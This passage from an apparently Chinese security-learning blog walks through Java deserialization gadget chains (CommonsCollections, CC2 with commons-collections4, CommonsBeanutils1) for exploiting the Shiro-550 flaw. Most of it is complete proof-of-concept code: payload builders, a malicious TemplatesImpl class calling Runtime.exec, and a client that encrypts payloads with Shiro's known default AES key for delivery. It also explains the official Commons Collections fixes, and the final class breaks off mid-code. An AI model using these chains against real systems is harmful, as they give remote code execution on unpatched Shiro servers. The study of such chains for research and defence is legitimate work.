发现`org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass`中使用的是`org.apache.shiro.util.ClassUtils#forName`（实际上内部用到了 `org.apache.catalina.loader.ParallelWebappClassLoader#loadClass`）

而其父类使用的是java原生的`Class.forName`
可以在异常捕捉这里下断点，看哪个类触发了异常
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240306121052424.png)

其实在tomcat报错处也能看到提示
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240306120937960.png)
异常时加载的类名为`[Lorg.apache.commons.collections.Transformer;`，其实是表示`org.apache.commons.collections.Transformer`的数组。
即需要构造的Gadget中不能存在数组
两个思路：1、JRMP 2、TemplatesImpl
这里我们用`TemplatesImpl`试试，回忆一下
执行Java字节码：
```java
TemplatesImpl obj = new TemplatesImpl();  
setFieldValue(obj, "_bytecodes", new byte[][] {code});  
setFieldValue(obj, "_name", "HelloTemplatesImpl");  
setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());  
  
obj.newTransformer();
```
利用`InvokerTransformer`调用`TemplatesImpl#newTransformer`方法：
```java
Transformer[] transformers = new Transformer[]{
	new ConstantTransformer(obj),
	new InvokerTransformer("newTransformer", null, null),
};
```
但这里还是用到了`Transformer`数组，如何不使用？
https://www.anquanke.com/post/id/192619
在CommonsCollections6中，用到的`TiedMapEntry`，其构造函数接受两个参数，分别是`Map`和对象`key`。
`TiedMapEntry`类有个`getValue`方法，调用了map的get方法，并传入了key：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240306141856212.png)
若这个map是LazyMap时，其get方法就是触发transform的关键点：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240306142144212.png)
之前构造CC Gadget时，我们对`LazyMap#get`方法的参数key是不关注的，因为通常Transformer数组的首个对象是ConstantTransformer，我们通过ConstantTransformer来初始化恶意对象。

但此时无法使Transformer数组了，也无法使用ConstantTransformer了。解决方法就是`LazyMap#get`的参数key，会被传入transformer()，实际上它扮演了一个类似ConstantTransformer这样的简单对象的传递者角色。

所以可以修改为：
```java
Transformer[] transformers = new Transformer[]{
	//new ConstantTransformer(obj),
	new InvokerTransformer("newTransformer", null, null),
};
```
数组长度变成1，也就不需要数组了。
### 构造Poc
从CommonsCollections6改为CommonsCollectionsShiro:

首先,创建`TemplatesImpl`对象：
```java
TemplatesImpl obj = new TemplatesImpl();  
setFieldValue(obj, "_bytecodes", new byte[][] {code});  
setFieldValue(obj, "_name", "HelloTemplatesImpl");  
setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());  
  
obj.newTransformer();
```
然后，再创建一个用来调用newTransformer方法的InvokerTransformer，但注意的是，先传入一个“无害”的方法，比如`getClass`，避免恶意方法在构造Gadget时触发：
```java
Transformer transformer = new InvokerTransformer("getClass", null, null);
```

再把CommonsCollections6的代码复制过来，并将`TiedMapEntry`构造时的第二个参数key，改为前面创建的`TemplatesImpl`对象：
```java
Map innerMap = new HashMap();  
Map outerMap = LazyMap.decorate(innerMap, transformer);  
  
TiedMapEntry tme = new TiedMapEntry(outerMap, obj);  
  
Map expMap = new HashMap();  
expMap.put(tme, "valuevalue");  

//outerMap.remove("keykey");
    //
outerMap.clear();
```
这里的`outerMap.clear();`和`outerMap.remove("keykey");`效果相同。

最后再把`InvokerTransformer`的方法从“无害”的`getClass`改成`newTransformer`:
```java
setFieldValue(transformer, "iMethodName", "newTransformer");
```

完整Poc:
```java
package com.govuln.shiroattack;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionsShiro {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public byte[] getPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("getClass", null, null);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformer);

        TiedMapEntry tme = new TiedMapEntry(outerMap, obj);

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");

        outerMap.clear();
        setFieldValue(transformer, "iMethodName", "newTransformer");

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        return barr.toByteArray();
    }
}
```

### 攻击Shiro
写一个Client.java来装配CommonsCollectionsShiro：
```java
package com.govuln.shiroattack;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class Client {
    public static void main(String []args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(com.govuln.shiroattack.Evil.class.getName());
        byte[] payloads = new CommonsCollectionsShiro().getPayload(clazz.toBytecode());

        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
}
```
这里使用到的javassist这是一个字节码操纵的第三方库，可以帮助将恶意类
https://www.javassist.org/
`com.govuln.shiroattack.Evil`生成字节码再交给`TemplatesImpl`
Evil.java
```java
package com.govuln.shiroattack;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Evil extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    public Evil() throws Exception {
        super();
        System.out.println("Hello TemplatesImpl");
        Runtime.getRuntime().exec("open -a Calculator.app");
    }
}
```
执行Client.java 成功弹出计算器
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240306145256704.png)
## CC2
### commons-collections4
Apache Commons Collections是⼀个著名的辅助开发库，包含了⼀些Java中没有的数据结构和和辅助⽅法，不过随着Java9以后的版本中原⽣库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。
在2015年底commons-collections反序列化利⽤链被提出时，Apache Commons Collections有以下两个分⽀版本：
- commons-collections:commons-collections
- org.apache.commons:commons-collections4

前者为3.2.1版本，后者为官方在2014年推出的4.0版本，那为什么会分成两个不同的分支呢？

官⽅认为旧的commons-collections有⼀些架构和API设计上的问题，但修复这些问题，会产⽣⼤量不能向前兼容的改动。所以，commons-collections4不再认为是⼀个⽤来替换commons-collections的新版本，⽽是⼀个新的包，两者的命名空间不冲突，因此可以共存在同⼀个项⽬中。

那在3.2.1中存在反序列化利用链，那4.0版本是否存在呢？

### 比较
在一个项目的pom.xml中共存
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240307155621798.png)
3.2.1版本的Gadget中依赖的报名都为`org.apache.commons.collections`
4.0版本的包名都变成了`org.apache.commons.collections4`

例如用CC6为例，将代码拷贝一遍，把`import org.apache.commons.collections.*`均替换为`import org.apache.commons.collections4.*`，此时报错，原因为`LazyMap.decorate`这个方法不存在：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240307160505087.png)

来看3.2.1版本中的`decorate`的定义：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240307160903257.png)

这个方法不过就是`LazyMap`构造函数的一个包装，而在4.0.0版本中改名为`lazyMap`:
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240307160719673.png)


所以将Gadget中出错的代码换一下名字`decorate`-->`lazyMap`后执行成功：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240307161721685.png)
同理CommonsCollection1、CommonsCollections3都可以在commons-collections4中正常使用。

### PriorityQueue利⽤链
ysoserial还为commons-collections4准备了两条新的利⽤链，那就是 CommonsCollections2和CommonsCollections4。

commons-collections包这么多利用链的一方面是因为该包的使用量大，另一方面是其中包含了一些可以执行任意方法的`Transformer`。所以，在commons-collections中找Gadget的过程，实际可简化为从

`Serializable#readObject()`方法到`Transformer#transform()`方法的调用链。

来看CC2,其中两个关键类：
- `java.util.PriorityQueue`
- `org.apache.commons.collections4.comparators.TransformingComparator`

`java.util.PriorityQueue`是一个有自己`readObject()`方法的类：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240311092246581.png)
`org.apache.commons.collections4.comparators.TransformingComparator`中有调用`transform()`方法的函数：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240311092437995.png)
所以CC2实际就是一条从`PriorityQueue`到`TransformingComparator`的利用链。
```
PriorityQueue#readObject() 
-->heapify() 
-->siftDown() 
-->siftDownUsingComparator() 
-->comparator.compare()
-->TransformingComparator
```

![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240311093228857.png)

补充总结：
- `java.util.PriorityQueue`是一个优先队列(Queue)，基于二叉堆实现，队列中每一个元素有自己的优先级，节点之间按照优先级大小排序成一棵树。
- 反序列化时为什么需要调用`heapify()`方法？为了反序列化后，需要恢复（保证）这个结构的顺序
- 排序是靠将大的元素下移实现的。`siftDown()`是将节点下移的函数，而`comparator.compare`是用来比较两个元素的大小。
- `TransformingComparator`实现了`java.util.Comparator`接口，这个接口用于定义两个对象如何进行比较。`siftDownUsingComparator() `中就使用这个接口的`compare()`方法比较树的节点。
https://www.cnblogs.com/linghu-java/p/9467805.html

构造Poc:
首先，创建Tranformer
```java
    Transformer[] fakeTransformers = new Transformer[] { new ConstantTransformer(1)};
    Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{ String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{ null, new Object[0]}),
            new InvokerTransformer("exec", new Class[] {String.class}, new String[] {"open -a Calculator.app"}),
    };
    Transformer transformerChain = new ChainedTransformer(fakeTransformers);
```
再创建一个`TransformingComparator`,传入我们的Transformer:
```java
Comparator comparator = new TransformingComparator(transformerChain);
```
实例化`PriorityQueue`对象，第一个参数为初始化时的大小，至少需要2个元素才会触发排序和比较，所以是2；第二个参数是比较时的Comparator，传入前面实例化的comparator:
```java
PriorityQueue queue = new PriorityQueue(2, comparator);  
queue.add(1);  
queue.add(2);
```
随便添加两个数字，这里可以传入非null的任意对象，因为Transformer是忽略传入参数的。
最后，将真正的恶意Transformer设置上：
```java
setFieldValue(transformerChain, "iTransformers", transformers);
```
Poc:
```java
package com.govuln.deserialization;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;

public class CommonsCollections2Test {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"open -a Calculator.app"}),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Comparator comparator = new TransformingComparator(transformerChain);

        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);

        setFieldValue(transformerChain, "iTransformers", transformers);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }
}
```
执行成功弹出计算器
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240311101020897.png)

### PriorityQueue利⽤链改进
之前提到，使用`TemplatesImpl`可以构造出无Transformer数组的利用链，尝试把CC2的链用同样的方法改造一下：
首先，创建`TemplatesImpl`对象：
```java
TemplatesImpl obj = new TemplatesImpl();  
setFieldValue(obj, "_bytecodes", new byte[][]{getBytescode()});  
setFieldValue(obj, "_name", "HelloTemplatesImpl");  
setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
```
创建“无害”的`InvokerTransformer`对象，并用它实例化`Comparator`：
```java
Transformer transformer = new InvokerTransformer("toString", null, null);  
Comparator comparator = new TransformingComparator(transformer);
```
实例化`PriorityQueue`,但此时向队列里添加的元素就得是创建的`TemplatesImpl`对象了：
（因为这里无法使用Transformer数组，也就不能使用ConstantTransformer来初始化变量，需要接受外部传入的变量。）
```java
PriorityQueue queue = new PriorityQueue(2, comparator);  
queue.add(obj);  
queue.add(obj);
```
最后，将`toString`方法改为恶意方法`newTransformer`:
```java
setFieldValue(transformer, "iMethodName", "newTransformer");
```
完整Poc:
```java
package com.govuln.deserialization;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CommonsCollections2TemplatesImpl {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    protected static byte[] getBytescode() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(evil.EvilTemplatesImpl.class.getName());
        return clazz.toBytecode();
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{getBytescode()});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        Transformer transformer = new InvokerTransformer("toString", null, null);
        Comparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(obj);
        queue.add(obj);

        setFieldValue(transformer, "iMethodName", "newTransformer");

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```

### 官方修复方法
了解了commons-collections4的几种Gadget原理，思考：
- PriorityQueue的利⽤链是否⽀持在commons-collections 3中使⽤？
答：不能，因为`org.apache.commons.collections4.comparators.TransformingComparator`，在commons-collections4.0以前的版本是没有实现`Serializable`接口的，所以无法在反序列化中使用。
- Apache Commons Collections官⽅是如何修复反序列化漏洞的？
答：Apache Commons Collections官⽅在2015年底得知序列化相关的问题后，就在两个分⽀上同时发布了新的版本，4.1和3.2.2。
3.2.2中，代码新增了一个方法`FunctorUtils#checkUnsafeSerialization`，用于检测反序列化是否安全。如果开发者没有设置全局配置`org.apache.commons.collections.enableUnsafeSerialization=true`，则会抛出异常。
该检查方法在常见的危险Transformer类（`InstantiateTransformer`、 `InvokerTransformer`、`PrototypeFactory`、`CloneTransformer`等）中的`readObject`里进行调用。
4.1中，这几个危险Transformer类不再实现`Serialiazable`接口。

## CommonsBeanutils与commons-collections的Shiro反序列化利用
结合之前提到的CC2中使用到的`java.util.Comparator`，是否还有其他可以利用`java.util.Comparator`的对象呢？
### CB
Apache Commons Beanutils是Apache Commons工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。
https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680
比如Cat是一个最简单的JavaBean类：
```java
public class Cat {
    private String name = "catalina";

    public String getName() { return this.name; }
    public void setName(String name) { this.name = name; }
}
```
它包含一个私有属性name，和读取、设置这个属性的两个方法，又称为getter和setter。其中，getter的方法名以get开头，setter的方法名以set开头，全名符合骆驼式命名法。

commons-beanutils中提供了一个静态方法`PropertyUtils.getProperty`，让使用者可以直接调用任意的JavaBean的getter方法，例如：
```java
PropertyUtils.getProperty(new Cat(), "name");
```
此时，commons-beanutils会自动找到name属性的getter方法，也就是`getName`，然后调用，获得返回值。除此以外，`PropertyUtils.getProperty`还支持递归获取属性，比如：

a对象中有属性b,b对象中有属性a,可以通过这样的方式递归获取
```java
PropertyUtils.getProperty(a, "b.c");
```
通过这个方法，使用者可以很方便地调用任意对象的getter，适用于在不确定JavaBean是哪个类对象时使用。
当然，commons-beanutils中注入此类的方法还有很多，如调用setter、拷贝属性等。
### getter妙用
利用的话需找到可以利用的`java.util.Comparator`对象，在commons-beanutils包中就存在一个：`org.apache.commons.beanutils.BeanComparator`
`BeanComparator`是commons-beanutils提供的用来比较两个JavaBean是否相等的类，其实现了`java.util.Comparator`接口，看其compare方法：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240311104939421.png)
该方法传入两个对象，
如果`this.property`为空，则直接比较这两个对象；
如果`this.property`不为空，则用`PropertyUtils.getProperty`分别取这两个对象的`this.property`属性，比较属性的值。

回忆上面介绍得commons-beanutils中提供了一个静态方法`PropertyUtils.getProperty`，让使用者可以直接调用任意的JavaBean的getter方法。那有没有什么getter方法可以执行恶意代码呢？

回忆在CC3前讲到的`利用TemplatesImpl加载字节码`时，提到的：
	从`TransletClassLoader#defineClass()`向前追溯一下调用链：
		TemplatesImpl#getOutputProperties()
		TemplatesImpl#newTransformer()
		TemplatesImpl#getTransletInstance()
		TemplatesImpl#defineTransletClasses()
		TransletClassLoader#defineClass()
	跟进最前面的两个方法`TemplatesImpl#getOutputProperties()`和`TemplatesImpl#newTransformer()`，两者的作用域都是public，可以被外部调用。

这里提到的`TemplatesImpl#getOutputProperties()`方法是要用的调用链上的一环，它的内部调用了`TemplatesImpl#newTransformer()`，也就是后面常用来执行恶意字节码的方法：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240311110136756.png)
不难发现`getOutputProperties()`这个名字，正好是以`get`开头，正符合getter的定义。
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240311110547202.png)
所以，当o1是一个`TemplatesImpl`对象，而`property`的值为`outputProperties`时，将会自动调用`getter`,也就是`TemplatesImpl#getOutputProperties()`方法，触发代码执行。
### 构造Poc
首先，创建TemplatesImpl：
```java
TemplatesImpl obj = new TemplatesImpl();  
setFieldValue(obj, "_bytecodes", new byte[][]{  
        ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()  
});  
setFieldValue(obj, "_name", "HelloTemplatesImpl");  
setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());  
```
tips:创建的EvilTemplatesImpl.java
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240311144439175.png)

然后，实例化`BeanComparator`。`BeanComparator`构造函数为空时，默认的`property`就为空：
```java
final BeanComparator comparator = new BeanComparator();
```
然后用这个comparator实例化优先队列`PriorityQueue`:
```java
final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);  
// stub data for replacement later  
queue.add(1);  
queue.add(1);
```
在队列中，添加了两个无害的可以比较的对象。
刚才说到，`BeanComparator#compare()`中，如果`this.property`为空，则直接比较这两个对象，在这里即就是对这两个`1`进行排序。

初始化时使用“正经”的对象，且`property`为空，是为了初始化时不出错。

然后再用反射将`property`的值设置成“恶意”的`OutputProperties`,将队列里的两个`1`替换成“恶意”的`TemplatesImpl`对象：
```java
setFieldValue(comparator, "property", "outputProperties");  
setFieldValue(queue, "queue", new Object[]{obj, obj});
```

完整Poc:
```java
package com.govuln.deserialization;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.BeanComparator;

public class CommonsBeanutils1 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()
        });
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
```
执行成功弹出计算器
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240311144311401.png)
相比于ysoserial里的CommonsBeanutils1利用链，刚才用的这条利用链去掉了对`java.math.BigInteger`的使用，因为ysoserial为了兼容`property=lowestSetBit`,但实际上我们将`property`设置为null即可。

### Shiro-550
之前提到的Shiro反序列化漏洞CC利用方式，在**shirodemo**例子中的依赖：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240311150225297.png)
其中，commons-collections3.2.1其作用为演示漏洞，而非会影响功能的依赖。那么**在实际的场景下，目标如果没有安装commons-collections，这个时候shiro反序列化漏洞是否可以利用呢？**

将pom.xml中commons-collections部分删除，重新加载Maven：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240311150620392.png)
发现commons-beanutils在其依赖中，即shiro是依赖于commons-beanutils的。那么，是否可以用到刚才那条CommonsBeanutils1的利用链呢？
CommonsBeanutilsTest.java
```java
package com.govuln.shiroattack;


import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

public class CommonsBeanutilsTest {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public byte[] getPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
    }
}
```
ClientTest.java
```java
package com.govuln.shiroattack;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

public class ClientTest {
    public static void main(String []args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(Evil.class.getName());
        byte[] payloads = new CommonsBeanutilsTest().getPayload(clazz.toBytecode());

        AesCipherService aes = new AesCipherService();
        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
}
```
执行生产Payload在Burp中发送后发现并未执行成功，Tomcat报错：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240311162012406.png)
#### 两个异常
1、serialVersionUID是什么？
如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的`serialVersionUID`值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的`serialVersionUID`不同，则反序列化就会异常退出，避免后续的未知隐患。

也可以手工给类赋予一个`serialVersionUID`值，就能手工控制兼容性了。

所以出现错误的原因是本地使用的commons-beanutils是1.9.2版本的，而Shiro中自带的commons-beanutils是1.8.3版本，版本不同，`serialVersionUID`自然就不同。

解决办法：
将本地的commons-beanutils也换成与Shiro环境一致的1.8.3版本。

2、更换版本一致后，Tomcat依然报了另外一个异常：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240311165623203.png)
没找到`org.apache.commons.collections.comparators.ComparableComparator`类，从包名即可看出，这个类是来自于commons-collections。
也就是说commons-beanutils本来就是依赖于commons-collections的，但在shiro中，commons-beanutils虽然包含了一部分commons-collections的类，但却不全，所有正常使用shiro的时候不需要依赖于commons-collections，但在反序列化时需要依赖于commons-collections。

#### 构造无依赖的Shiro反序列化利用链
先看`org.apache.commons.collections.comparators.ComparableComparator`这个类在哪里使用了：
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240311162840861.png)
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240311163008681.png)
在`BeanComparator`类的构造函数处，当没有显式传入`Comparator`的情况下，则默认使用`ComparableComparator`。
既然此时没有`ComparableComparator`，则需要找到一个类来替换，该类需满足：
- 实现`java.util.Comparator`接口
- 实现`java.io.Serialiazable`接口
- Java、shiro或者commons-beanutils自带，且兼容性强
通过IDEA，找到了一个`CaseInsensitiveComparator`:
![](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2024/03/12/image-20240311163443931.png)
这个`CaseInsensitiveComparator`类是`java.lang.String`类下的一个内部私有类，其实现了`Comparator`和`Serializable`，且位于Java的核心代码中，兼容性强，完全满足条件。

可以通过`String.CASE_INSENSITIVE_ORDER`即可拿到上下文中的`CaseInsensitiveComparator`对象，用它来实例化`BeanComparator`:
```java
final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
```
最终构造出完整Poc:
```java
package com.govuln.shiroattack;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsBeanutils1Shiro {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public byte[] getPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();

        return barr.toByteArray();
